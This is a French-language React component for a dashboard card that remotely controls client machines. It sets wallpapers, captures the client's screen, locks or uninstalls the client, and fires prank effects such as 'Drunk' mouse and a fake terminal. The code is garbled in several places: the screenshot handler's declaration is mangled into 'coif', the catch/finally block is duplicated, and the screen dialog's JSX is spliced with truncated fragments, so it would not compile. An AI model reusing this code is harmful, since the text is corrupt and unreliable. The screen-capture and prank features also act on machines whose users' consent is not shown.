import { useState, useRef } from "react";
import type { MouseEvent } from "react";
import { api, BASE_URL } from "../services/api";
import type { Client } from "../services/api";
import { Button } from "./ui/button";
import { Card } from "./ui/card";
import { Input } from "./ui/input";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "./ui/dialog";
import { toast } from "sonner";
import { ClientLogs } from "./ClientLogs";
import { 
  Monitor, RefreshCw, Upload, Image,
  Layout, RotateCw, Sparkles, ScrollText, Send, Mouse, Check, Zap, Terminal,
  PartyPopper, Flashlight, Code, Type, Waves, Disc, Rocket, Wand2, Lock, Trash2, MoreVertical, Eye, Loader2
} from "lucide-react";

interface ClientCardProps {
  client: Client;
  isSelectionMode?: boolean;
  isSelected?: boolean;
  onToggleSelect?: (e: MouseEvent) => void;
}

type Tab = 'wallpaper' | 'marquee' | 'particles';

export function ClientCard({ client, isSelectionMode, isSelected, onToggleSelect }: ClientCardProps) {
  const clientId = client.id;
  const fileInputRef = useRef<HTMLInputElement>(null);
  
  const [activeTab, setActiveTab] = useState<Tab>('wallpaper');
  const [inputUrl, setInputUrl] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isLogsOpen, setIsLogsOpen] = useState(false);
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isScreenOpen, setIsScreenOpen] = useState(false);
  const [isCapturing, setIsCapturing] = useState(false);
  const [screenTimestamp, setScreenTimestamp] = useState(Date.now());

  const tabs = [
    { id: 'wallpaper' as Tab, icon: Image, label: 'Fond' },
    { id: 'marquee' as Tab, icon: ScrollText, label: 'Marquee' },
    { id: 'particles' as Tab, icon: Sparkles, label: 'Particles' },
  ];

  // Envoi par URL selon l'onglet actif
  const handleSendUrl = async () => {
    if (!inputUrl.trim()) return;
    setIsLoading(true);
    try {
      if (activeTab === 'wallpaper') {
        await api.changeWallpaper(clientId, inputUrl);
      } else if (activeTab === 'marquee') {
        await api.marquee(clientId, inputUrl);
      } else {
        await api.particles(clientId, inputUrl);
      }
      toast.success(`Envoyé avec succès`);
      setInputUrl("");
    } catch (error: any) {
      toast.error(error.message || "Échec");
    } finally {
      setIsLoading(false);
    }
  };

  // Upload fichier selon l'onglet actif
  const handleUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setIsLoading(true);
    try {
      if (activeTab === 'wallpaper') {
        await api.uploadWallpaper(clientId, file);
      } else if (activeTab === 'marquee') {
        await api.uploadMarquee(clientId, file);
      } else {
        await api.uploadParticles(clientId, file);
      }
      toast.success(`Uploadé avec succès`);
    } catch (error: any) {
      toast.error(error.message || "Échec");
    } finally {
      setIsLoading(false);
      if (fileInputRef.current) fileInputRef.current.value = "";
    }
  };

  const handleTriggerUpdate = async () => {
    try {
      await api.triggerUpdate(clientId);
      toast.success(`Mise à jour`);
    } catch (error: any) {
      toast.error(error.message || "Échec");
    }
  };

  const handleAction = async (action: () => Promise<any>, label: string) => {
    try {
      await action();
      toast.success(label);
    } catch (error: any) {
      toast.error(error.message || `Échec`);
    }
  };

  coif (isCapturing) return;
    setIsCapturing(true);
    try {
        await api.requestScreenshot(clientId);
        toast.info("Demande envoyée, attente de la capture...");
        
        // Attendre 4s que le client upload l'image
        await new Promise(resolve => setTimeout(resolve, 4000));
        
        setScreenTimestamp(Date.now());
        toast.success("Capture mise à jour");
    } catch (e: any) {
        toast.error(e.message || "Erreur capture");
    } finally {
        setIsCapturing(false
        toast.error(e.message || "Erreur capture");
    }
  };

  return (
    <Card 
      className={`
        group relative overflow-hidden rounded-2xl border border-border/50 bg-card/80 backdrop-blur-sm
        transition-all duration-300 hover:border-primary/30 hover:shadow-lg hover:shadow-primary/5
        ${isSelectionMode ? 'cursor-pointer' : ''}
        ${isSelected ? 'ring-2 ring-primary border-primary' : ''}
      `}
      onClick={(e) => {
        if (isSelectionMode || e.ctrlKey || e.metaKey) {
          onToggleSelect?.(e);
        }
      }}
    >
      <ClientLogs clientId={clientId} isOpen={isLogsOpen} onClose={() => setIsLogsOpen(false)} />

      {/* Checkbox de sélection */}
      {isSelectionMode && (
        <div className="absolute top-4 right-4 z-50">
          <div className={`
            h-5 w-5 rounded-md border-2 flex items-center justify-center transition-all
            ${isSelected ? 'bg-primary border-primary scale-110' : 'border-muted-foreground/50 bg-background/80'}
          `}>
            {isSelected && <Check className="h-3 w-3 text-primary-foreground" />}
          </div>
        </div>
      )}

      {/* Header compact */}
      <div className="flex items-center justify-between p-4 pb-3">
        <div className="flex items-center gap-3">
          <div className="relative">
            <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-gradient-to-br from-primary/20 to-primary/5 text-primary">
              <Monitor className="h-5 w-5" />
            </div>
            <span className="absolute -right-0.5 -top-0.5 h-2.5 w-2.5 rounded-full bg-green-500 ring-2 ring-card" />
          </div>
          <div>
            <h3 className="font-semibold text-foreground">{clientId}</h3>
            <div className="flex items-center gap-1.5 mt-0.5">
              <span className="text-[10px] text-muted-foreground bg-muted/50 px-1.5 py-0.5 rounded">
                v{client.version || "?"}
              </span>
              {client.hostname && (
                <span className="text-[10px] text-muted-foreground bg-muted/50 px-1.5 py-0.5 rounded">
                  {client.hostname}
                </span>
              )}
            </div>
          </div>
        </div>
        
        {!isSelectionMode && (
          <div className="flex gap-1 relative">
            {api.isAdmin() && (
              <>
                <Button 
                  variant="ghost" 
                  size="icon" 
                  className="h-8 w-8 rounded-lg text-muted-foreground hover:text-primary hover:bg-primary/10" 
                  onClick={(e) => { e.stopPropagation(); setIsMenuOpen(!isMenuOpen); }}
                  title="More actions"
                >
                  <MoreVertical className="h-4 w-4" />
                </Button>

                {isMenuOpen && (
                  <>
                    <div 
                      className="fixed inset-0 z-40" 
                      onClick={(e) => { e.stopPropagation(); setIsMenuOpen(false); }} 
                    />
                    <div className="absolute top-9 right-0 z-50 min-w-[140px] bg-popover border border-border rounded-md shadow-md p-1 flex flex-col gap-1 animate-in fade-in zoom-in-95 duration-200">
                      <button
                        className="flex items-center gap-2 px-2 py-1.5 text-xs rounded-sm hover:bg-accent hover:text-accent-foreground w-full text-left transition-colors"
                        onClick={(e) => { 
                          e.stopPropagation(); 
                          handleAction(() => api.lock(clientId), "Verrouiller");
                          setIsMenuOpen(false);
                        }}
                      >
                        <Lock className="h-3.5 w-3.5" />
                        Lock Session
                      </button>
                      <button
                        className="flex items-center gap-2 px-2 py-1.5 text-xs rounded-sm hover:bg-accent hover:text-accent-foreground w-full text-left transition-colors"
                        onClick={(e) => { 
                          e.stopPropagation(); 
                          setIsLogsOpen(true);
                          setIsMenuOpen(false);
                        }}
                      >
                        <Terminal className="h-3.5 w-3.5" />
                        View Logs
                      </button>
                      <div className="h-px bg-border/50 my-0.5" />
                      <button
                        className="flex items-center gap-2 px-2 py-1.5 text-xs rounded-sm hover:bg-destructive hover:text-destructive-foreground text-destructive w-full text-left transition-colors"
                        onClick={(e) => { 
                          e.stopPropagation();
                          if (confirm("Êtes-vous sûr de vouloir désinstaller ce client ?")) {
                            handleAction(() => api.uninstallClient(clientId, "web"), "Désinstallation");
                          }
                          setIsMenuOpen(false);
                        }}
                      >
                        <Trash2 className="h-3.5 w-3.5" />
                        Uninstall
                      </button>
                    </div>
                  </>
                )}
              </>
            )}
            <Button 
              variant="ghost" 
              size="icon" 
              className="h-8 w-8 rounded-lg text-muted-foreground hover:text-primary hover:bg-primary/10" 
              onClick={(e) => { e.stopPropagation(); handleTriggerUpdate(); }}
              title="Update"
            >
              <RefreshCw className="h-4 w-4" />
            </Button>
          </div>
        )}
      </div>

      {/* Contenu principal */}
      <div className={`px-4 pb-4 space-y-3 ${isSelectionMode ? 'pointer-events-none opacity-40' : ''}`}>
        
        {/* Onglets élégants */}
        <div className="flex bg-muted/30 rounded-lg p-1 gap-1">
          {tabs.map(({ id, icon: Icon, label }) => (
            <button
              key={id}
              onClick={() => { setActiveTab(id); setInputUrl(""); }}
              className={`
                flex-1 flex items-center justify-center gap-1.5 py-2 rounded-md text-xs font-medium transition-all
                ${activeTab === id 
                  ? 'bg-background text-foreground shadow-sm' 
                  : 'text-muted-foreground hover:text-foreground'
                }
              `}
            >
              <Icon className="h-3.5 w-3.5" />
              {label}
            </button>
          ))}
        </div>

        {/* Zone de saisie unifiée */}
        <div className="flex gap-2">
          <div className="relative flex-1">
            <Input 
              placeholder="Coller une URL d'image..." 
              value={inputUrl}
              onChange={(e) => setInputUrl(e.target.value)}
              onKeyDown={(e) => e.key === "Enter" && handleSendUrl()}
              className="h-10 bg-muted/30 border-0 pr-10 text-sm placeholder:text-muted-foreground/50 focus-visible:ring-1 focus-visible:ring-primary/50"
              disabled={isLoading}
            />
            <Button 
              size="icon" 
              onClick={handleSendUrl} 
              disabled={isLoading || !inputUrl.trim()} 
              className="absolute right-1 top-1 h-8 w-8 rounded-md"
            >
              <Send className="h-3.5 w-3.5" />
            </Button>
          </div>
          <label className="flex items-center justify-center h-10 w-10 rounded-lg bg-muted/30 hover:bg-primary/10 cursor-pointer transition-colors group/upload">
            <Upload className="h-4 w-4 text-muted-foreground group-hover/upload:text-primary transition-colors" />
            <input 
              ref={fileInputRef}
              type="file" 
              accept="image/*"
              className="hidden"
              onChange={handleUpload}
              disabled={isLoading}
            />
          </label>
        </div>

        {/* Séparateur subtil */}
        <div className="h-px bg-border/50" />

        {/* Actions rapides - style pilules */}
        <div className="flex gap-2 mb-2">
          <button
            onClick={() => handleAction(() => api.showDesktop(clientId), "Bureau")}
            className="flex-1 flex items-center justify-center gap-1.5 h-9 rounded-lg bg-muted/30 hover:bg-primary/10 text-muted-foreground hover:text-primary text-xs font-medium transition-colors"
            title="Bureau"
          >
            <Layout className="h-3.5 w-3.5" />
            Bureau
          </button>
          <button
            onClick={() => handleAction(() => api.reverseScreen(clientId), "Inversé")}
            className="flex-1 flex items-center justify-center gap-1.5 h-9 rounded-lg bg-muted/30 hover:bg-primary/10 text-muted-foreground hover:text-primary text-xs font-medium transition-colors"
            title="Inverser"
          >
            <RotateCw className="h-3.5 w-3.5" />
            Inversé
          </button>
          <button
            onClick={() => { setIsScreenOpen(true); handleRequestScreen(); }}
            className="flex-1 flex items-center justify-center gap-1.5 h-9 rounded-lg bg-muted/30 hover:bg-primary/10 text-muted-foreground hover:text-primary text-xs font-medium transition-colors"
            title="Voir l'écran"
          >
            <Eye className="h-3.5 w-3.5" />
            Écran w-full">
                <div className="relative min-h-[300px] flex items-center justify-center bg-muted/20 rounded border w-full overflow-hidden">
                    {isCapturing && (
                        <div className="absolute inset-0 flex items-center justify-center bg-background/50 backdrop-blur-sm z-10 transition-all">
                            <div className="flex flex-col items-center gap-2">
                                <Loader2 className="h-8 w-8 animate-spin text-primary" />
                                <span className="text-sm font-medium text-muted-foreground">Capture en cours...</span>
                            </div>
                        </div>
                    )}
                    <img 
                        key={screenTimestamp}
                        src={`${BASE_URL}/uploads/screenshots/${clientId}.jpg?t=${screenTimestamp}`} 
                        alt={`Écran de ${clientId}`} 
                        crossOrigin="anonymous"
                        className="max-w-full max-h-[70vh] w-auto h-auto rounded shadow-sm object-contain"
                        onError={(e) => {
                            // Si pas en cours de capture, on met l'image d'erreur
                            // Sinon on laisse l'image précédente ou vide le temps que ça charge
                            if (!isCapturing) {
                                (e.target as HTMLImageElement).src = "https://placehold.co/600x400?text=Image+indisponible";
                            }
                        }}
                    />
                </div>
                
                <div className="flex gap-2">
                  <Button onClick={handleRequestScreen} disabled={isCapturing} className="gap-2 min-w-[160px]">
                      {isCapturing ? <Loader2 className="h-4 w-4 animate-spin" /> : <RefreshCw className="h-4 w-4" />}
                      {isCapturing ? "En cours..." : "Actualiser la capture"}
                  </Button>
                </divsOrigin="anonymous"
                    className="max-w-full h-auto rounded border shadow-sm"
                    onError={(e) => {
                        (e.target as HTMLImageElement).src = "https://placehold.co/600x400?text=Image+indisponible";
                    }}
                />
                <Button onClick={handleRequestScreen} className="gap-2">
                    <RefreshCw className="h-4 w-4" />
                    Actualiser la capture
                </Button>
            </div>
        </DialogContent>
      </Dialog>

        <Dialog>
          <DialogTrigger asChild>
            <Button variant="outline" className="w-full gap-2 h-9 bg-muted/30 hover:bg-primary/10 border-0 text-muted-foreground hover:text-primary">
              <Wand2 className="h-4 w-4" />
              Effects
            </Button>
          </DialogTrigger>
          <DialogContent className="sm:max-w-[425px]">
            <DialogHeader>
              <DialogTitle>Effects for {clientId}</DialogTitle>
            </DialogHeader>
            <div className="grid grid-cols-3 gap-3 py-4">
              <Button 
                variant="outline" 
                className="h-20 flex flex-col gap-2 hover:bg-accent hover:text-accent-foreground"
                onClick={() => handleAction(() => api.clones(clientId), "Clones")}
              >
                <Mouse className="h-6 w-6" />
                <span className="text-xs">Clones</span>
              </Button>

              <Button 
                variant="outline" 
                className="h-20 flex flex-col gap-2 hover:bg-accent hover:text-accent-foreground"
                onClick={() => handleAction(() => api.drunk(clientId), "Drunk")}
              >
                <Zap className="h-6 w-6" />
                <span className="text-xs">Drunk</span>
              </Button>

              <Button 
                variant="outline" 
                className="h-20 flex flex-col gap-2 hover:bg-accent hover:text-accent-foreground"
                onClick={() => handleAction(() => api.faketerminal(clientId), "Terminal")}
              >
                <Code className="h-6 w-6" />
                <span className="text-xs">Terminal</span>
              </Button>

              <Button 
                variant="outline" 
                className="h-20 flex flex-col gap-2 hover:bg-accent hover:text-accent-foreground"
                onClick={() => handleAction(() => api.confetti(clientId), "Confetti")}
              >
                <PartyPopper className="h-6 w-6" />
                <span className="text-xs">Confetti</span>
              </Button>

              <Button 
                variant="outline" 
                className="h-20 flex flex-col gap-2 hover:bg-accent hover:text-accent-foreground"
                onClick={() => handleAction(() => api.spotlight(clientId), "Spotlight")}
              >
                <Flashlight className="h-6 w-6" />
                <span className="text-xs">Spotlight</span>
              </Button>

              <Button 
                variant="outline" 
                className="h-20 flex flex-col gap-2 hover:bg-accent hover:text-accent-foreground"
                onClick={() => {
                  const text = prompt("Texte à afficher :", "HELLO WORLD");
                  if (text !== null) handleAction(() => api.textscreen(clientId, text), "Text Screen");
                }}
              >
                <Type className="h-6 w-6" />
                <span className="text-xs">Text</span>
              </Button>

              <Button 
                variant="outline" 
                className="h-20 flex flex-col gap-2 hover:bg-accent hover:text-accent-foreground"
                onClick={() => handleAction(() => api.wavescreen(clientId), "Wave Screen")}
              >
                <Waves className="h-6 w-6" />
                <span className="text-xs">Wave</span>
              </Button>

              <Button 
                variant="outline" 
                className="h-20 flex flex-col gap-2 hover:bg-accent hover:text-accent-foreground"
                onClick={() => handleAction(() => api.dvdbounce(clientId), "DVD Bounce")}
              >
                <Disc className="h-6 w-6" />
                <span className="text-xs">DVD</span>
              </Button>

              <Button 
                variant="outline" 
                className="h-20 flex flex-col gap-2 hover:bg-accent hover:text-accent-foreground"
                onClick={() => handleAction(() => api.fireworks(clientId), "Fireworks")}
              >
                <Rocket className="h-6 w-6" />
                <span className="text-xs">Fireworks</span>
              </Button>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    </Card>
  );
}
